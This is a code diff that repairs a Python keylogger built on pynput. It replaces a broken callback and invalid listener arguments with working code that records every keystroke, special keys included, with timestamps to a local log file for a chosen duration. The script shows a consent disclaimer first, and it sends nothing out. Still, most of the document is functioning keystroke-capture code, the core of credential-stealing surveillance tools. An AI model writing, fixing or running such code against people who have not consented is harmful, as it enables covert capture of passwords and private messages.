@@ -1,23 +1,10 @@
-import pynput
+from pynput import keyboard
 import time
 import os
-from getpass import getpass
+import sys
 
 # Defines the log file path
 log_file_path = "keylogger_log.txt"
-
-# Defines the keylogger function
-def keylogger(key):
-    # Consume the keyboard event to prevent it from being displayed on the screen
-    key.ignore()
-
-    # Format the timestamp and key press event
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    event = f"{timestamp} - {key}\n"
-
-    # Writes the event to the log file
-    with open(log_file_path, "a") as log_file:
-        log_file.write(event)
 
 # Displays the disclaimer and get user acceptance
 print("---------------- Keylogger Disclaimer ----------------")
@@ -38,11 +25,35 @@ if accept_terms.lower() != 'y':
     print("You must accept the terms and conditions before using this program.")
     sys.exit()
 
+# Callback function to log keystrokes
+def keylogger(key):
+    try:
+        # Format the timestamp and key press event
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        event = f"{timestamp} - {key.char}\n"
+    except AttributeError:
+        # Handle special keys like space, enter, etc.
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        if key == keyboard.Key.space:
+            event = f"{timestamp} - [SPACE]\n"
+        elif key == keyboard.Key.enter:
+            event = f"{timestamp} - [ENTER]\n"
+        elif key == keyboard.Key.backspace:
+            event = f"{timestamp} - [BACKSPACE]\n"
+        elif key == keyboard.Key.esc:
+            event = f"{timestamp} - [ESC]\n"
+        else:
+            event = f"{timestamp} - {key}\n"
+
+    # Writes the event to the log file
+    with open(log_file_path, "a") as log_file:
+        log_file.write(event)
+
 # Prompts the user to enter the duration for which the keystrokes should be logged
 log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))
 
-# Sets up the keylogger listener with the mask_tokens parameter to hide key presses from the screen
-listener = pynput.keyboard.Listener(on_press=keylogger, mask_tokens=[pynput.keyboard.Key.cmd, pynput.keyboard.Key.ctrl])
+# Sets up the keylogger listener
+listener = keyboard.Listener(on_press=keylogger)
 listener.start()
 
 # Runs the keylogger for the specified duration
@@ -57,4 +68,3 @@ listener.stop()
 
 # Displays the log file path
 print("\nThe log file has been saved to:", os.path.abspath(log_file_path))
-
